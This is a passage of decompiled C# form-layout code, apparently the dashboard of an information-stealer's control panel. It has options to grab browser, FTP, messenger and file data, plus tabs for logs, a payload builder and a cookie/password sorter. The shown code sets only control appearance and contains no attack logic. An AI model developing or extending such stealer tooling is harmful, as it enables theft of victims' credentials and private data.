        ((System.Windows.Forms.Control)this.metroSetDivider10).TabIndex = 102;
        ((System.Windows.Forms.Control)this.metroSetDivider10).Text = "metroSetDivider10";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider10).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider10).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider10).Thickness = 1;
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.saveSettingsBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.saveSettingsBtn).Location = new System.Drawing.Point(354, 608);
        ((System.Windows.Forms.Control)this.saveSettingsBtn).Name = "saveSettingsBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.saveSettingsBtn).Size = new System.Drawing.Size(133, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.saveSettingsBtn).TabIndex = 101;
        ((System.Windows.Forms.Control)this.saveSettingsBtn).Text = "Save settings";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveSettingsBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.saveSettingsBtn).Click += new System.EventHandler(saveSettingsBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.addSearchPatternBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addSearchPatternBtn).Location = new System.Drawing.Point(1057, 321);
        ((System.Windows.Forms.Control)this.addSearchPatternBtn).Name = "addSearchPatternBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addSearchPatternBtn).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.addSearchPatternBtn).TabIndex = 97;
        ((System.Windows.Forms.Control)this.addSearchPatternBtn).Text = "Add";
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.addSearchPatternBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.addSearchPatternBtn).Click += new System.EventHandler(addSearchPatternBtn_Click);
        ((GuiLib.AnimaTextBox)this.searchPatternTb).Dark = false;
        ((System.Windows.Forms.Control)this.searchPatternTb).Location = new System.Drawing.Point(545, 321);
        ((GuiLib.AnimaTextBox)this.searchPatternTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.searchPatternTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.searchPatternTb).Name = "searchPatternTb";
        ((GuiLib.AnimaTextBox)this.searchPatternTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.searchPatternTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.searchPatternTb).Size = new System.Drawing.Size(506, 23);
        ((System.Windows.Forms.Control)this.searchPatternTb).TabIndex = 96;
        ((GuiLib.AnimaTextBox)this.searchPatternTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.searchPatternLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.searchPatternLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.searchPatternLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.searchPatternLbl).Location = new System.Drawing.Point(542, 303);
        ((System.Windows.Forms.Control)this.searchPatternLbl).Name = "searchPatternLbl";
        ((System.Windows.Forms.Control)this.searchPatternLbl).Size = new System.Drawing.Size(124, 15);
        ((System.Windows.Forms.Control)this.searchPatternLbl).TabIndex = 95;
        ((System.Windows.Forms.Control)this.searchPatternLbl).Text = "Enter a search pattern:";
        ((System.Windows.Forms.Control)this.getFilesSettingsLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.getFilesSettingsLb).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        ((System.Windows.Forms.Control)this.getFilesSettingsLb).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.blackListCms_3;
        ((System.Windows.Forms.Control)this.getFilesSettingsLb).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.getFilesSettingsLb).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.getFilesSettingsLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.getFilesSettingsLb).HorizontalScrollbar = true;
        ((System.Windows.Forms.ListBox)this.getFilesSettingsLb).ItemHeight = 18;
        ((System.Windows.Forms.Control)this.getFilesSettingsLb).Location = new System.Drawing.Point(545, 40);
        ((System.Windows.Forms.Control)this.getFilesSettingsLb).Name = "getFilesSettingsLb";
        ((System.Windows.Forms.Control)this.getFilesSettingsLb).Size = new System.Drawing.Size(587, 254);
        ((System.Windows.Forms.Control)this.getFilesSettingsLb).TabIndex = 92;
        ((System.Windows.Forms.Control)this.getFilesSettingsLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.getFilesSettingsLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.getFilesSettingsLbl).Location = new System.Drawing.Point(542, 7);
        ((System.Windows.Forms.Control)this.getFilesSettingsLbl).Name = "getFilesSettingsLbl";
        ((System.Windows.Forms.Control)this.getFilesSettingsLbl).Size = new System.Drawing.Size(171, 30);
        ((System.Windows.Forms.Control)this.getFilesSettingsLbl).TabIndex = 91;
        ((System.Windows.Forms.Control)this.getFilesSettingsLbl).Text = "Get files settings:";
        ((System.Windows.Forms.Label)this.getFilesSettingsLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.grabFilesLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.grabFilesLbl).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.grabFilesLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.grabFilesLbl).Location = new System.Drawing.Point(54, 100);
        ((System.Windows.Forms.Control)this.grabFilesLbl).Name = "grabFilesLbl";
        ((System.Windows.Forms.Control)this.grabFilesLbl).Size = new System.Drawing.Size(72, 21);
        ((System.Windows.Forms.Control)this.grabFilesLbl).TabIndex = 90;
        ((System.Windows.Forms.Control)this.grabFilesLbl).Text = "Get Files:";
        ((System.Windows.Forms.Label)this.grabFilesLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.grabFilesCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFilesCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFilesCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFilesCb).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFilesCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFilesCb).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.grabFilesCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFilesCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.grabFilesCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.grabFilesCb).Location = new System.Drawing.Point(229, 105);
        ((System.Windows.Forms.Control)this.grabFilesCb).Name = "grabFilesCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFilesCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.grabFilesCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFilesCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFilesCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.grabFilesCb).TabIndex = 89;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFilesCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFilesCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.grabImClientsLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.grabImClientsLbl).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.grabImClientsLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.grabImClientsLbl).Location = new System.Drawing.Point(54, 72);
        ((System.Windows.Forms.Control)this.grabImClientsLbl).Name = "grabImClientsLbl";
        ((System.Windows.Forms.Control)this.grabImClientsLbl).Size = new System.Drawing.Size(107, 21);
        ((System.Windows.Forms.Control)this.grabImClientsLbl).TabIndex = 88;
        ((System.Windows.Forms.Control)this.grabImClientsLbl).Text = "Get IM clients:";
        ((System.Windows.Forms.Label)this.grabImClientsLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.grabImClientsCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabImClientsCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabImClientsCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabImClientsCb).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabImClientsCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabImClientsCb).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.grabImClientsCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabImClientsCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.grabImClientsCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.grabImClientsCb).Location = new System.Drawing.Point(229, 77);
        ((System.Windows.Forms.Control)this.grabImClientsCb).Name = "grabImClientsCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabImClientsCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.grabImClientsCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabImClientsCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabImClientsCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.grabImClientsCb).TabIndex = 87;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabImClientsCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabImClientsCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.grabFtpsLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.grabFtpsLbl).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.grabFtpsLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.grabFtpsLbl).Location = new System.Drawing.Point(54, 44);
        ((System.Windows.Forms.Control)this.grabFtpsLbl).Name = "grabFtpsLbl";
        ((System.Windows.Forms.Control)this.grabFtpsLbl).Size = new System.Drawing.Size(108, 21);
        ((System.Windows.Forms.Control)this.grabFtpsLbl).TabIndex = 86;
        ((System.Windows.Forms.Control)this.grabFtpsLbl).Text = "Get ftp clients:";
        ((System.Windows.Forms.Label)this.grabFtpsLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.grabFtpsCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFtpsCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFtpsCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFtpsCb).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFtpsCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFtpsCb).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.grabFtpsCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFtpsCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.grabFtpsCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.grabFtpsCb).Location = new System.Drawing.Point(229, 49);
        ((System.Windows.Forms.Control)this.grabFtpsCb).Name = "grabFtpsCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFtpsCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.grabFtpsCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFtpsCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFtpsCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.grabFtpsCb).TabIndex = 85;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFtpsCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabFtpsCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.grabBrowsersLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.grabBrowsersLbl).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.grabBrowsersLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.grabBrowsersLbl).Location = new System.Drawing.Point(54, 17);
        ((System.Windows.Forms.Control)this.grabBrowsersLbl).Name = "grabBrowsersLbl";
        ((System.Windows.Forms.Control)this.grabBrowsersLbl).Size = new System.Drawing.Size(105, 21);
        ((System.Windows.Forms.Control)this.grabBrowsersLbl).TabIndex = 84;
        ((System.Windows.Forms.Control)this.grabBrowsersLbl).Text = "Get browsers:";
        ((System.Windows.Forms.Label)this.grabBrowsersLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.grabBrowsersCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabBrowsersCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabBrowsersCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabBrowsersCb).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabBrowsersCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabBrowsersCb).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.grabBrowsersCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabBrowsersCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.grabBrowsersCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.grabBrowsersCb).Location = new System.Drawing.Point(229, 20);
        ((System.Windows.Forms.Control)this.grabBrowsersCb).Name = "grabBrowsersCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabBrowsersCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.grabBrowsersCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabBrowsersCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabBrowsersCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.grabBrowsersCb).TabIndex = 83;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabBrowsersCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.grabBrowsersCb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.partnersTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.partnersTab).Controls.Add((System.Windows.Forms.Control)this.partnerPoster6);
        ((System.Windows.Forms.Control)this.partnersTab).Controls.Add((System.Windows.Forms.Control)this.partnerPoster5);
        ((System.Windows.Forms.Control)this.partnersTab).Controls.Add((System.Windows.Forms.Control)this.partnerPoster4);
        ((System.Windows.Forms.Control)this.partnersTab).Controls.Add((System.Windows.Forms.Control)this.partnerPoster3);
        ((System.Windows.Forms.Control)this.partnersTab).Controls.Add((System.Windows.Forms.Control)this.partnerPoster2);
        ((System.Windows.Forms.Control)this.partnersTab).Controls.Add((System.Windows.Forms.Control)this.partnerPoster1);
        ((System.Windows.Forms.Control)this.partnersTab).Font = new System.Drawing.Font("Segoe UI", 9f);
        ((System.Windows.Forms.Control)this.partnersTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.partnersTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.partnersTab).Name = "partnersTab";
        ((System.Windows.Forms.Control)this.partnersTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.partnersTab).TabIndex = 19;
        ((System.Windows.Forms.Control)this.partnersTab).Text = "Advertisement";
        ((System.Windows.Forms.Control)this.partnerPoster6).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.partnerPoster6).Location = new System.Drawing.Point(800, 326);
        ((System.Windows.Forms.Control)this.partnerPoster6).Name = "partnerPoster6";
        ((System.Windows.Forms.Control)this.partnerPoster6).Size = new System.Drawing.Size(250, 306);
        ((System.Windows.Forms.Control)this.partnerPoster6).TabIndex = 5;
        ((System.Windows.Forms.Control)this.partnerPoster5).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.partnerPoster5).Location = new System.Drawing.Point(460, 326);
        ((System.Windows.Forms.Control)this.partnerPoster5).Name = "partnerPoster5";
        ((System.Windows.Forms.Control)this.partnerPoster5).Size = new System.Drawing.Size(250, 306);
        ((System.Windows.Forms.Control)this.partnerPoster5).TabIndex = 4;
        ((System.Windows.Forms.Control)this.partnerPoster4).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.partnerPoster4).Location = new System.Drawing.Point(115, 326);
        ((System.Windows.Forms.Control)this.partnerPoster4).Name = "partnerPoster4";
        ((System.Windows.Forms.Control)this.partnerPoster4).Size = new System.Drawing.Size(250, 306);
        ((System.Windows.Forms.Control)this.partnerPoster4).TabIndex = 3;
        ((System.Windows.Forms.Control)this.partnerPoster3).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.partnerPoster3).Location = new System.Drawing.Point(800, 9);
        ((System.Windows.Forms.Control)this.partnerPoster3).Name = "partnerPoster3";
        ((System.Windows.Forms.Control)this.partnerPoster3).Size = new System.Drawing.Size(250, 306);
        ((System.Windows.Forms.Control)this.partnerPoster3).TabIndex = 2;
        ((System.Windows.Forms.Control)this.partnerPoster2).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.partnerPoster2).Location = new System.Drawing.Point(460, 9);
        ((System.Windows.Forms.Control)this.partnerPoster2).Name = "partnerPoster2";
        ((System.Windows.Forms.Control)this.partnerPoster2).Size = new System.Drawing.Size(250, 306);
        ((System.Windows.Forms.Control)this.partnerPoster2).TabIndex = 1;
        ((System.Windows.Forms.Control)this.partnerPoster1).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.partnerPoster1).Location = new System.Drawing.Point(115, 9);
        ((System.Windows.Forms.Control)this.partnerPoster1).Name = "partnerPoster1";
        ((System.Windows.Forms.Control)this.partnerPoster1).Size = new System.Drawing.Size(250, 306);
        ((System.Windows.Forms.Control)this.partnerPoster1).TabIndex = 0;
        ((System.Windows.Forms.BindingSource)this.object_15).DataSource = typeof(Meta.SharedModels.UserLog);
        ((System.Windows.Forms.BindingSource)this.object_12).DataSource = typeof(Meta.SharedModels.UserLog);
        ((System.Windows.Forms.BindingSource)this.object_14).DataSource = typeof(Meta.SharedModels.UserLog);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.White;
        base.ClientSize = new System.Drawing.Size(1366, 674);
        base.Controls.Add((System.Windows.Forms.Control)this.dashboardTabs);
        base.Controls.Add((System.Windows.Forms.Control)this.topHeader);
        base.Controls.Add((System.Windows.Forms.Control)this.panel1);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "MainFrm";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Dashboard";
        ((System.Windows.Forms.Control)this.logContextMenu).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.m_a3).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.blackListCms_1).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.blackListCms_2).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.blackListCms_3).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.topHeader).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.topHeader).PerformLayout();
        ((System.Windows.Forms.Control)this.c1).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.bc).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.c4).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.blackListCms_6).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.blackListCms_7).ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.object_13).EndInit();
        ((System.Windows.Forms.Control)this.blackListCms_8).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.dashboardTabs).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.logsTab).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.logsTab).PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.logsListView).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.object_16).EndInit();
        ((System.Windows.Forms.Control)this.statisticTab).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.statisticTab).PerformLayout();
        ((System.Windows.Forms.Control)this.guestLinkTab).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.guestLinkTab).PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.guestFilesDgv).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.object_18).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.guestLinksDgv).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.object_19).EndInit();
        ((System.Windows.Forms.Control)this.sorterTab).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.sorterTab).PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.cookiesMoreThan).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.passMoreThan).EndInit();
        ((System.Windows.Forms.Control)this.builderTab).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.builderTab).PerformLayout();
        ((System.Windows.Forms.Control)this.refresherTab).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.refresherTab).PerformLayout();
        ((System.Windows.Forms.Control)this.mergerTab).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.scannerTab).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.miscTab).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.miscTab).PerformLayout();
        ((System.Windows.Forms.Control)this.m_b2).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.m_b2).PerformLayout();
        ((System.Windows.Forms.Control)this.notificationTab).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.f7).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.f7).PerformLayout();
        ((System.Windows.Forms.Control)this.logHeaderTab).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.settingsTab).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.settingsTab).PerformLayout();
        ((System.Windows.Forms.Control)this.partnersTab).ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.object_15).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.object_12).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.object_14).EndInit();
        base.ResumeLayout(false);
    }

    [CompilerGenerated]
    private void method_9(object a, uint b)
    {
        if (b != 0)
        {
